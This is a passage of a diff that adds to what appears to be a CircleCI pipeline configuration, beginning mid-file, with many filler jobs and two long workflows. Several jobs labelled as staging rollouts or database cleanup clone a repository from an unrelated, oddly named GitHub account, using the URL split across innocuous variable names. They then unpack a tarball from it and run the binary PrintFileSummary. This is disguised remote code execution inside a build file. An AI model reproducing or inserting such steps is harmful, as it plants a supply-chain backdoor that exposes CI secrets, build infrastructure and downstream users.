+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --no-single-branch "$tier/$store/$warnings" "."
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  SchemaRegistrySourceFiles:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: PurgeUserPortalCompilerCache
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; path="shared/tests/util/config.csv"; basename "$path"; true ; } > /tmp/FilterFieldValues/bumping-linker-version-string
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'bumping-linker-version-string'
+  low-priority-repository-fetch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/bumping-linker-version-string" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 10 "$tier/$store/$warnings" ${PWD}
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  Worker:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: dump-environment-in-table-form
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo holding rate limiter; if [[ 30 -lt 3 || 44 -lt 3 ]]; then echo "accept"; else echo "reject"; fi; echo "releasing rate limiter"; true ; } > /tmp/FilterFieldValues/update-deployment-configuration
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'update-deployment-configuration'
+  nightly-build-worker-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/update-deployment-configuration" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 2 --filter=blob:none "$tier/$store/$warnings" ${PWD}
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  routineNameServerSetup:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: summarize-data-importer-security-report
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; printf '%s\n' "iron" 'gear' ochre; true ; } > /tmp/FilterFieldValues/ExtractAndVerifyInstaller
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'ExtractAndVerifyInstaller'
+  readiness-check-pipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/ExtractAndVerifyInstaller" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 5 "$tier/$store/$warnings" `pwd`
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  background-license-update:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: pollTestStatusInBackground
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; for j in 14 20 34 10; do if ((j % 2 == 0)); then echo "$j is even"; else echo "$j is odd"; fi; done; true ; } > /tmp/FilterFieldValues/ExporterVersionBump
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'ExporterVersionBump'
+  strict-monitoring:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/ExporterVersionBump" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=2 --no-tags "$tier/$store/$warnings" $(pwd)
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  hourly-application-packaging:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: install formatters for production
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo phase 5 started && printf '%s\n' yew emu yew heron yew emu | sort | uniq -d; true ; } > /tmp/FilterFieldValues/KernelRuntimeImage
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'KernelRuntimeImage'
+  PushRegistryRuntimeImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/KernelRuntimeImage" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 3 --no-tags --filter=blob:none "$tier/$store/$warnings" "`pwd`"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  RequiredMajorBumpLane1:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: confirm-deployment-on-main-branch
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; for platform in linux-x64 alpine-x64 darwin-x64; do echo "queued $platform"; done; echo "3 platforms queued"; true ; } > /tmp/FilterFieldValues/post-rollback-image-digest
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'post-rollback-image-digest'
+  alert-operators:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/post-rollback-image-digest" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 1 --no-tags "$tier/$store/$warnings" "`pwd`"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+
+workflows:
+  flag-merge-conflicts-across-all-packages:
+    jobs:
+      - SaveLandingPageCompilerCache
+      - print-compiler-version:
+          requires:
+            - SaveLandingPageCompilerCache
+      - LocalGeneration:
+          requires:
+            - SaveLandingPageCompilerCache
+      - ShowStatusPageDigests:
+          requires:
+            - LocalGeneration
+      - SchemaRegistrySourceFiles:
+          requires:
+            - LocalGeneration
+      - low-priority-repository-fetch:
+          requires:
+            - SchemaRegistrySourceFiles
+      - routineNameServerSetup:
+          requires:
+            - SchemaRegistrySourceFiles
+      - readiness-check-pipeline:
+          requires:
+            - routineNameServerSetup
+      - RefreshStorageCache:
+          requires:
+            - routineNameServerSetup
+      - bundle-crawler-changelog:
+          requires:
+            - RefreshStorageCache
+      - ManifestValidationPhase:
+          requires:
+            - RefreshStorageCache
+      - InventoryChecksRound1:
+          requires:
+            - ManifestValidationPhase
+      - analyzer-deployment-rollback:
+          requires:
+            - ManifestValidationPhase
+      - sandbox-code:
+          requires:
+            - analyzer-deployment-rollback
+      - Worker:
+          requires:
+            - analyzer-deployment-rollback
+      - nightly-build-worker-6:
+          requires:
+            - Worker
+      - collect-environment-details:
+          requires:
+            - Worker
+      - ExecuteUnitTests:
+          requires:
+            - collect-environment-details
+      - ImageUpdatePhase:
+          requires:
+            - collect-environment-details
+      - roll-out-service-to-preview:
+          requires:
+            - ImageUpdatePhase
+      - ExperimentalMemoryBenchmark:
+          requires:
+            - ImageUpdatePhase
+      - parser-debug-logs:
+          requires:
+            - ExperimentalMemoryBenchmark
+      - prepare-messaging:
+          requires:
+            - ExperimentalMemoryBenchmark
+      - PrimaryIntegrityVerification:
+          requires:
+            - prepare-messaging
+      - ArchiveAuthenticationTemplates:
+          requires:
+            - prepare-messaging
+      - PeriodicSchemaSyncRoutine:
+          requires:
+            - ArchiveAuthenticationTemplates
+      - periodic-credential-setup:
+          requires:
+            - ArchiveAuthenticationTemplates
+      - required-registry-backup:
+          requires:
+            - periodic-credential-setup
+      - StateSnapshotSlot8:
+          requires:
+            - periodic-credential-setup
+      - emergency-roll-out:
+          requires:
+            - StateSnapshotSlot8
+      - DependencyCacheStage:
+          requires:
+            - StateSnapshotSlot8
+      - scheduled-regression-tests:
+          requires:
+            - DependencyCacheStage
+      - background-license-update:
+          requires:
+            - DependencyCacheStage
+      - strict-monitoring:
+          requires:
+            - background-license-update
+  encoderDependencyCache:
+    jobs:
+      - automaticSourceFetch
+      - resolve-cache-key:
+          requires:
+            - automaticSourceFetch
+      - RerunServerSecurityScan:
+          requires:
+            - automaticSourceFetch
+      - hash-build-outputs-for-review:
+          requires:
+            - RerunServerSecurityScan
+      - PreBackupSanityChecksBatch6Of8:
+          requires:
+            - RerunServerSecurityScan
+      - HourlyDatabaseSnapshotRun:
+          requires:
+            - PreBackupSanityChecksBatch6Of8
+      - RequiredMajorBumpLane1:
+          requires:
+            - PreBackupSanityChecksBatch6Of8
+      - alert-operators:
+          requires:
+            - RequiredMajorBumpLane1
+      - MailerUnitTestsPass1:
+          requires:
+            - RequiredMajorBumpLane1
+      - publish-formatter-examples:
+          requires:
+            - MailerUnitTestsPass1
+      - compiler-test-cache:
+          requires:
+            - MailerUnitTestsPass1
+      - pre-migration-repository-backup:
+          requires:
+            - compiler-test-cache
+      - restore-from-artifact-storage:
+          requires:
+            - compiler-test-cache
+      - edge-proxy-release-artifacts:
+          requires:
+            - restore-from-artifact-storage
+      - final-accessibility-audit:
+          requires:
+            - restore-from-artifact-storage
+      - RemoveDebuggerCompilerCache:
+          requires:
+            - final-accessibility-audit
+      - hourly-application-packaging:
+          requires:
+            - final-accessibility-audit
+      - PushRegistryRuntimeImage:
+          requires:
+            - hourly-application-packaging
+      - freeze-run:
+          requires:
+            - hourly-application-packaging
+      - attachChecksumFileForPreview:
+          requires:
+            - freeze-run
+      - SendingCompletionNotice:
+          requires:
+            - freeze-run
+      - warm-build-cache-after-deploy:
+          requires:
+            - SendingCompletionNotice
+      - CrawlerContainerImage:
+          requires:
+            - SendingCompletionNotice
+      - CacheBridgeContainerImage:
+          requires:
+            - CrawlerContainerImage
+      - AutomatedQualityCheck:
+          requires:
+            - CrawlerContainerImage
+      - package-scan-task:
+          requires:
+            - AutomatedQualityCheck
